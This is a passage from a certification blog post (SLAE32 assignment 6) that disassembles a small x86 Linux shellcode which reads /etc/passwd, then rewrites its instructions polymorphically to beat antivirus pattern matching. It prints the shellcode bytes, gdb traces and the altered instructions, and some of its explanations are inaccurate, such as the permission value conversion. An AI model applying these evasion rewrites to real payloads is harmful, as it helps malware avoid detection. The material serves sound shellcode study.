---
layout: single
title: 'SLAE32 - Assignment #6 - Create Polymorphic Shellcode'
date: 2019-06-26
classes: wide
comments: false
header:
  teaser: /assets/images/SLAE32/SLAE32.jpg
tags:
  - SLAE32
  - Pentester Academy
  - Linux
  - x86
  - Shellcoding
  - polymorphism
--- 


<!--img class="wp-image-4320 aligncenter" style="width:280px;border:none;" src="{{ site.baseurl }}/assets/images/SLAE32/SLAE32.jpg" alt="" /-->
<h2><span style="color:#339966;"><strong>Student ID : SLAE &nbsp;- 1314</strong></span></h2>
<p><span style="color:#339966;"><strong>Assignment 6:</strong></span></p>
<p class="has-text-align-left">In this assignment, polymorphism will be shown in practice. The following three <em>shellcodes </em>posted on&nbsp;<a href="http://shell-storm.org/">shell-sotrm.org</a>&nbsp;will be used<strong><br /></strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-842.php" target="_blank" rel="noopener">Tiny read file shellcode</a></li>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-813.php" target="_blank" rel="noopener">ASLR deactivation </a></li>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-893.php" target="_blank" rel="noopener">Add map in /etc/hosts file</a></li>
</ul>
<ul>
<li style="text-align:justify;"><strong>The goal of this assignment is to take up three shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching</strong>.</li>
<li style="text-align:justify;"><strong>The polymorphic versions cannot be larger 150% of the existing Shellcode <br /></strong></li>
<li style="text-align:justify;"><strong>Bonus points for making it shorter in length than the original</strong></li>
</ul>
<p><!-- /wp:list --></p>
<p><!-- wp:quote --></p>
<blockquote class="wp-block-quote"><p><em>Disclaimer</em> :</p>
<p><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert &nbsp;certification</em></p>
</blockquote>
<p><!-- /wp:quote --></p>
<p><!-- wp:quote --></p>
<blockquote class="wp-block-quote"><p>The full source code and scripts can be found at <a href="https://github.com/xen0vas/SLAE/tree/master/Assignment6" >github</a></p>
</blockquote>
<p><!-- /wp:quote --></p>
<p><!-- wp:paragraph --></p>
<p style="text-align:justify;">Polymorphism is a technique that is used to create code mutation keeping the initial functionality intact. That is, the code changes, but the functionality of the code will not change at all. This method for example is needed in order to obfuscate the executable to evade <em>Antivirus</em> detection mechanism.</p>
<p style="text-align:justify;">Furthermore, there is a need to understand how the arguments passed into system calls in <strong>x86</strong> assembly. The arguments are passed into system calls as follows, for 32-bit calls, <strong>eax</strong> contains the system call number, and its parameters are placed in <strong>ebx, ecx, edx, esi, edi, </strong>and<strong> ebp</strong>. To be more specific of how the arguments passed into the system calls, the <a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">Linux Syscall Reference</a> is a helpful online resource that references the system calls and their arguments in relation with the <strong>x86</strong> registers.</p>
<h2><span style="color:#339966;"><strong>Tiny read file shellcode</strong></span></h2>
<h3><strong>Read the passwd file  </strong></h3>
<p style="text-align:justify;">The first <em>shellcode</em> to be examined in order to perform polymorphic changes is the Tiny read file which is available <a href="http://shell-storm.org/shellcode/files/shellcode-842.php" target="_blank" rel="noopener">here.</a> This <em>shellcode</em> reads from inside the <strong>/etc/passwd</strong> file and then outputs the contents of the file in the console. Proceeding further to analyse the <em>shellcode</em> there is a need to generate a disassembly listing of the original <em>shellcode</em> in order to get the assembly code and instructions.</p>
<p class="">
<!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -<br />00000000  31C9              xor ecx,ecx<br />00000002  F7E1              mul ecx<br />00000004  B005              mov al,0x5<br />00000006  51                push ecx<br />00000007  6873737764        push dword 0x64777373<br />0000000C  68632F7061        push dword 0x61702f63<br />00000011  682F2F6574        push dword 0x74652f2f<br />00000016  89E3              mov ebx,esp<br />00000018  CD80              int 0x80<br />0000001A  93                xchg eax,ebx<br />0000001B  91                xchg eax,ecx<br />0000001C  B003              mov al,0x3<br />0000001E  31D2              xor edx,edx<br />00000020  66BAFF0F          mov dx,0xfff<br />00000024  42                inc edx<br />00000025  CD80              int 0x80<br />00000027  92                xchg eax,edx<br />00000028  31C0              xor eax,eax<br />0000002A  B004              mov al,0x4<br />0000002C  B301              mov bl,0x1<br />0000002E  CD80              int 0x80<br />00000030  93                xchg eax,ebx<br />00000031  CD80              int 0x80
</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p style="text-align:justify;">Furthermore, the above instructions need to be isolated to a new file with the correct format for example <strong>polytiny.nasm</strong> and then analyzing it using <strong>gdb.</strong></p>
<p class="">
<!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u - | awk -F" " '{ print "\t" $3" "$4" "$5 }' | sed '1 i\\nglobal _start\n\nsection .text\n\n_start:'<br /><br />global _start<br /><br />section .text<br /><br />_start:<br />        xor ecx,ecx<br />        mul ecx<br />        mov al,0x5<br />        push ecx<br />        push dword 0x64777373<br />        push dword 0x61702f63<br />        push dword 0x74652f2f<br />        mov ebx,esp<br />        int 0x80<br />        xchg eax,ebx<br />        xchg eax,ecx<br />        mov al,0x3<br />        xor edx,edx<br />        mov dx,0xfff<br />        inc edx<br />        int 0x80<br />        xchg eax,edx<br />        xor eax,eax<br />        mov al,0x4<br />        mov bl,0x1<br />        int 0x80<br />        xchg eax,ebx<br />        int 0x80<br /> 
	<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span>#  echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u - | awk -F" " '{ print "\t" $3" "$4" "$5 }' | sed '1 i\\nglobal _start\n\nsection .text\n\n_start:' &gt; polytiny.nasm</pre>
<p>Before analysing the <em>shellcode,</em> it must be compiled using the following commands</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># nasm -f elf32 -F dwarf -g -o polytiny.o polytiny.nasm <br><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># ld -z execstack -o polytiny polytiny.o<br /><br /></pre>
<p>Then the debugging process of the executable file can be done using <strong>gdb</strong> as shown below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># gdb -q ./polytiny<br />Reading symbols from /home/xenofon/Documents/Assignment6/polytiny...done.<br />(gdb) set disassembly-flavor intel<br />(gdb) b _start<br />Breakpoint 1 at 0x8048080: file polytiny.nasm, line 7.<br />(gdb) r<br />Starting program: /home/xenofon/Documents/Assignment6/polytiny<br /><br />Breakpoint 1, _start () at polytiny.nasm:7
</pre>
<p>In order to have an overview of the executed file, the <strong>disass</strong> gdb command can be used as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">(gdb) disass<br />Dump of assembler code for function _start:<br /><span style="color:#ff0000;">=&gt; 0x08048080 &lt;+0&gt;: xor ecx,ecx</span><br />0x08048082 &lt;+2&gt;: mul ecx<br />0x08048084 &lt;+4&gt;: mov al,0x5<br />0x08048086 &lt;+6&gt;: push ecx<br />0x08048087 &lt;+7&gt;: push 0x64777373<br />0x0804808c &lt;+12&gt;: push 0x61702f63<br />0x08048091 &lt;+17&gt;: push 0x74652f2f<br />0x08048096 &lt;+22&gt;: mov ebx,esp<br />0x08048098 &lt;+24&gt;: int 0x80<br />0x0804809a &lt;+26&gt;: xchg ebx,eax<br />0x0804809b &lt;+27&gt;: xchg ecx,eax<br />0x0804809c &lt;+28&gt;: mov al,0x3<br />0x0804809e &lt;+30&gt;: xor edx,edx<br />0x080480a0 &lt;+32&gt;: mov dx,0xfff<br />0x080480a4 &lt;+36&gt;: inc edx<br />0x080480a5 &lt;+37&gt;: int 0x80<br />0x080480a7 &lt;+39&gt;: xchg edx,eax<br />0x080480a8 &lt;+40&gt;: xor eax,eax<br />0x080480aa &lt;+42&gt;: mov al,0x4<br />0x080480ac &lt;+44&gt;: mov bl,0x1<br />0x080480ae &lt;+46&gt;: int 0x80<br />0x080480b0 &lt;+48&gt;: xchg ebx,eax<br />0x080480b1 &lt;+49&gt;: int 0x80<br />End of assembler dump.</pre>
<p style="text-align:justify;">Furthermore, the <strong>stepin (si)</strong> <strong>gdb</strong> command can be used in order to follow the executable instructions step by step and check how the program deals with registers and memory. As seen above in red, the first command <strong>xor ecx, ecx</strong> is zeroing out the <strong>ecx</strong> register. The next command, <strong>mul ecx</strong>  used to zero out the <strong>eax</strong> register because the <strong>mul</strong> instruction always performs multiplication with <strong>eax</strong> register.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">Breakpoint 1, _start () at polytiny.nasm:7<br />7 xor ecx,ecx<br />(gdb) p/x $ecx<br />$2 = 0x0<br />(gdb) si<br />8 mul ecx<br />(gdb) p/x $eax<br />$1 = 0x0<br />(gdb)</pre>
<p style="text-align:justify;">the above <strong>xor ecx, ecx</strong> instruction can be altered without affecting the functionality of the program. The <strong>xor ecx, ecx</strong> can be changed to the following instruction performing equivalent operation.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">; Original Shellcode Instructions</span> <br />xor ecx, ecx<br /><br /><span style="color:#00ffff;">;Altered Shellcode Instructions</span><br /><span style="color:#00ff00;">shr ecx, 16</span></pre>
<p style="text-align:justify;">The <strong>shr eax, 16</strong> shifts the bits within the destination operand to the right by 16 positions affecting the lower half of the 32-bit register. This operation is zeroing out the <strong>cx </strong>register, but it is also increasing the length of the final shellcode because it consumes more space than the <strong>xor</strong> instruction<strong>.</strong></p>
<p style="text-align:justify;">From the original <em>shellcode</em>, the next instructions are used to implement the <strong>open</strong> system call.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">mov al,0x5<br />push ecx<br />push dword 0x64777373<br />push dword 0x61702f63<br />push dword 0x74652f2f<br />mov ebx,esp<br />int 0x80</pre>
<p style="text-align:justify;">the <strong>mov al, 0x5</strong> instruction puts the immediate value <strong>0x5</strong> inside the lower byte register <strong>al,</strong> thus indicates the <strong>open</strong> system call according with the definition found at <em><strong>unistd_32.h </strong></em>header file as shown at the screenshot below</p>
<p><img class="alignnone size-full wp-image-628" src="{{ site.baseurl }}/assets/images/2019/06/open.png" alt="open" width="839" height="163" /></p>
<p style="text-align:justify;">Furthermore, checking the <strong>open</strong> system call synopsis found <a href="https://man7.org/linux/man-pages/man2/open.2.html">here</a> there are more than one prototypes, but at the current case the following used.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><b>int open(const char *</b><i>pathname</i><b>, int </b><i>flags</i><b>);</b></pre>
<p style="text-align:justify;">The above function takes two arguments, the <strong>pathname</strong> of type const char* and the <strong>flags </strong>of type int. The <strong>pathname</strong> indicates the location of the file inside the filesystem and the <strong>flags</strong> constitute of the bitwise 'or' separated list of values that determine the method in which the file will be opened (whether it should be read only, read/write, .etc).</p>
<p style="text-align:justify;">The <strong>push ecx</strong> instruction pushes the <strong>ecx</strong> register ( which holds the zero value ) into the stack</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">(gdb) p/s $ecx<br />$1 = 0<br />(gdb)</pre>
<p style="text-align:justify;">The <strong>push ecx </strong>instruction indicates the first parameter of the <strong>open</strong> system call starting from left to right. Pushing the zero value into the stack indicates the <strong>O_RDONLY</strong> flag which stands for read only. The instruction can be altered as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">; Original Shellcode Instructions</span><br />push ecx<br /><br /><span style="color:#00ffff;">; Altered Shellcode Instructions</span><br /><span style="color:#00ff00;">mov dword [esp-4], ecx </span><br /><span style="color:#00ff00;">sub esp, 4</span></pre>
<p style="text-align:justify;">The above two instructions are performing the same thing as the  <strong>push ecx</strong> instruction does. In more detail,  <strong>ecx</strong> stored in memory using stack pointer minus 4 <strong>[esp-4]</strong> which is the <strong>esp </strong>offset referring to the type of the variable kept by <strong>ecx</strong> register which is  a type of <strong>DWORD</strong> that stands for 32-bit unsigned integer holding 4 bytes in memory. In order to reserve the available space in stack the <strong>sub esp, 4</strong>  instruction used, which makes room for a 4 byte local variable.</p>
<p style="text-align:justify;">Following, at the next three instructions from the original <em>shellcode</em>, the path of <strong>passwd</strong> file ( <em><strong>/etc/passwd</strong> )</em>  pushed in reverse order into the stack using the three instructions shown below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">;//etc/passwd<br />push dword 0x64777373<br />push dword 0x61702f63<br />push dword 0x74652f2f</pre>
<p style="text-align:justify;">Using some python scripting the above hexadecimal values are decoded into characters in reverse order  </p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">&gt;&gt;&gt; "64777373".decode("hex")<br /><strong>'dwss'</strong><br />&gt;&gt;&gt; "61702f63".decode("hex")<br />'<strong>ap/c'</strong><br />&gt;&gt;&gt; "74652f2f".decode("hex")<br />'<strong>te//'</strong><br />&gt;&gt;&gt;</pre>
<p style="text-align:justify;">In order to examine the values pushed into the stack, the produced output can be checked. </p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">Dump of assembler code for function _start:<br />   0x08048080 &lt;+0&gt;:     xor    ecx,ecx<br />   0x08048082 &lt;+2&gt;:     mul    ecx<br />   0x08048084 &lt;+4&gt;:     mov    al,0x5<br />   0x08048086 &lt;+6&gt;:     push   ecx<br />   0x08048087 &lt;+7&gt;:     push   0x64777373<br />   0x0804808c &lt;+12&gt;:    push   0x61702f63<br />   0x08048091 &lt;+17&gt;:    push   0x74652f2f<br />=&gt; 0x08048096 &lt;+22&gt;:    mov    ebx,esp<br />   0x08048098 &lt;+24&gt;:    int    0x80<br />   0x0804809a &lt;+26&gt;:    xchg   ebx,eax<br />   0x0804809b &lt;+27&gt;:    xchg   ecx,eax<br />   0x0804809c &lt;+28&gt;:    mov    al,0x3<br />   0x0804809e &lt;+30&gt;:    xor    edx,edx<br />   0x080480a0 &lt;+32&gt;:    mov    dx,0xfff<br />   0x080480a4 &lt;+36&gt;:    inc    edx<br />   0x080480a5 &lt;+37&gt;:    int    0x80<br />   0x080480a7 &lt;+39&gt;:    xchg   edx,eax<br />   0x080480a8 &lt;+40&gt;:    xor    eax,eax<br />   0x080480aa &lt;+42&gt;:    mov    al,0x4<br />   0x080480ac &lt;+44&gt;:    mov    bl,0x1<br />   0x080480ae &lt;+46&gt;:    int    0x80<br />   0x080480b0 &lt;+48&gt;:    xchg   ebx,eax<br />   0x080480b1 &lt;+49&gt;:    int    0x80<br />End of assembler dump.<br />14              mov ebx,esp<br />(gdb) x/12cb $esp<br />0xbffff730:     47 '/'  47 '/'  101 'e' 116 't' 99 'c'  47 '/'  112 'p' 97 'a'<br />0xbffff738:     115 's' 115 's' 119 'w' 100 'd'<br />(gdb)</pre>
<p style="text-align:justify;">The altered instructions below are doing the same thing as the <strong>push</strong> instruction. Particularly, the three <strong>mov</strong> commands shown above are moving the <strong>//etc/passwd</strong> path into the 12 bytes reserved space on stack using instruction <strong>sub esp, 0ch</strong> where all the variables with <strong>3*4</strong> bytes length are aligned.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">;instructions from original shellcode</span><br /><span style="color:#00ffff;">;//etc/passwd</span><br />push dword 0x64777373<br />push dword 0x61702f63<br />push dword 0x74652f2f<br /><br /><span style="color:#00ffff;">; altered instructions</span> <br /><span style="color:#00ff00;">mov dword [esp-4],0x64777373</span><br /><span style="color:#00ff00;">mov dword [esp-8], 0x61702f63</span><br /><span style="color:#00ff00;">mov dword [esp-0ch], 0x74652f2f</span><br /><span style="color:#00ff00;">sub esp, 0ch</span></pre>
<p style="text-align:justify;">Furthermore, the <strong>mov ebx, esp</strong> instruction will be used to set the new base pointer at the top of the stack after pushing all the function parameters into the stack.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">mov ebx, esp</pre>
<p style="text-align:justify;">Additionally, for the sake of polymorphism the following <strong>open</strong> system call will be used instead of the one discussed before which initially used from the original <em>shellcode</em>.  </p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
int open(const char *pathname, int flags, mode_t mode);
</pre>

<p style="text-align:justify;">The function above has one extra argument named <strong>mode</strong> of type mode_t. The argument <strong>mode</strong> represents the permissions in case a new file is created using the <strong>open</strong> function call with the <strong>O_CREAT</strong> flag. If a new file is not being created then this argument is ignored. In this case the <em>shellcode</em> only reads from <strong>/etc/passwd</strong> file which is a system file already created from the Linux operating system. According to the <strong>open</strong> function prototype one extra instruction will be added that will assign the extra mode to the opened file.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#99cc00;"><span style="color:#00ffff;">;Altered Shellcode Instruction</span><br /><span style="color:#00ff00;">mov dx, 0x1bc</span></span></pre>
<p style="text-align:justify;">The above instruction is adding the permission mode <strong>0x1bc</strong> in hex which is <strong>444</strong> in decimal that defines the read, permissions to the opened file for the owner, the group and others. Nevertheless, because the file already exists the instruction above is useless thus providing a polymorphic change to the <em>shellcode</em>. </p>
<p style="text-align:justify;">Then the <strong>int 0x80 </strong>instruction used to execute the system call referred by the <strong>0x5</strong> value that moved earlier inside the lower byte register <strong>al</strong>.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">int 0x80<span style="color:#00ffff;"><br /></span></pre>
<p style="text-align:justify;">The next instruction from the original <em>shellcode</em> used to exchange the <strong>eax</strong> as well as the <strong>ebx</strong> register values. </p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xchg eax,ebx</pre>
<p style="text-align:justify;">The <strong>open</strong> system call returns a file descriptor of the open file, along with the assigned permissions which can be used to allow reading the file. The <strong>eax</strong> register is holding the returned file descriptor from the <strong>open</strong> system call which will then be assigned at <strong>ebx</strong> register when the instruction executes. The <strong>ebx</strong> register represents the first argument of the <strong>read</strong> system call. Also, the <b>eax </b>register will temporarily hold the data returned from the open system call. The <strong>read</strong> system call synopsis can be seen <a href="https://man7.org/linux/man-pages/man2/read.2.html">here</a></p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
#include &lt;unistd.h>
ssize_t read(int fd, void *buf, size_t count);
</pre>

<p style="text-align:justify;">The <strong>read</strong> system call takes three arguments, the file descriptor <strong>fd</strong> of type int , the buffer <strong>buf</strong> of type void* holding the data to be read and the <strong>count</strong> of type size_t which provides the size of the data stored in <strong>buf.  </strong> Now that the <strong>ebx</strong> register holds the file descriptor, using the next instruction</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xchg eax,ecx</pre>
<p style="text-align:justify;">After the execution of the instruction above, the <strong>ecx</strong>  register will now hold the data stored temporarily at <strong>eax</strong> after the use of the <strong>xchg eax, ebx</strong> instruction. The <strong>ecx</strong> represents the second argument of the read system call and holds the buffered data of the opened file. The <strong>eax</strong> register will now be assigned with zero. In order to achieve polymorphism the above two instructions can be changed into the following instructions that are performing the same operation.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">;Altered Shellcode Instructions<br />;xchg ebx, eax</span><br /><span style="color:#00ff00;">mov edi, eax</span><br /><span style="color:#00ff00;">mov eax, ebx</span><br /><span style="color:#00ff00;">mov ebx, edi</span><br /><br /><span style="color:#00ffff;">;xchg ecx, eax</span><br /><span style="color:#00ff00;">mov esi, eax</span><br /><span style="color:#00ff00;">mov eax, ecx</span><br /><span style="color:#00ff00;">mov ecx, esi</span></pre>
<p style="text-align:justify;">The above instructions are doing the same thing as the previous instructions did with the use of the <strong>xchg</strong> command. The only drawback here is that the above instructions are increasing the length of the polymorphic version of the <em>shellcode</em>. So, in order to minimise the length, the above instructions can be altered as follows.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#99cc00;"><span style="color:#00ffff;">;Altered Shellcode Instructions</span><br /><span style="color:#00ff00;">mov ecx, ebx</span></span><br /><span style="color:#00ff00;">mov ebx, eax</span></pre>
<p style="text-align:justify;">In regard with the opened file ( <strong>/etc/passwd</strong> ), the <strong>mov ecx, ebx </strong>is assigning the data held in <strong>ebx</strong> inside the <strong>ecx </strong>register and the second instruction <strong>mov ebx, eax</strong> is assigning the file descriptor of the opened file to the <strong>ebx</strong> register.</p>
<p style="text-align:justify;">Now, one argument left to complete the read function. The third argument holds the size of the buffered data. This indicates the length of the buffer as needed from the operating system in order to reserve the available space for storing the data.</p>
<p style="text-align:justify;">Following, The <strong>read</strong> system call will be called in order to read the data using the file descriptor returned from the <strong>open</strong> system call. Before proceeding to call the <strong>read</strong> system call, first the system call number <strong>0x3</strong> needs to be stored into the lower byte register <strong>al </strong>(avoiding nulls).</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">;read from file</span><br />mov al, 3</pre>
